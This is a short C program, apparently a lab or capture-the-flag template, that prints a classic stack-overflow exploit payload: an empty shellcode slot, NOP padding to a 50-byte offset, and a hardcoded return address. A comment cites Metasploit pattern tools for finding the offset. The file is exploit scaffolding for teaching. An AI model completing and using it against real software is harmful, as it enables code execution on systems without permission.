#include <stdbool.h>
#include <memory.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

const int OFFSET_TO_RETURN_ADDRESS = 50; // Use pattern_create and pattern_offset from Metasploit
char addr[] = "\x30\xdd\xff\xff\xff\x7f"; // Note that it need to be in hex and written backwards

/**
 * clang -o exploit exploit.c
 */
int main(void) {
  char shellcode[] = "";

  size_t shellcode_size = (sizeof shellcode) - 1;

  int offset = OFFSET_TO_RETURN_ADDRESS;
  int padded_bytes = offset - shellcode_size;

  {
    fwrite(shellcode, 1, shellcode_size, stdout);
  }

  {
    char pad[] = "\x90";
    for (int i = 0; i < padded_bytes; i++)
      fwrite(pad, 1, 1, stdout);
  }

  {
    fwrite(addr, 1, 6, stdout);
  }

  putchar('\0');
}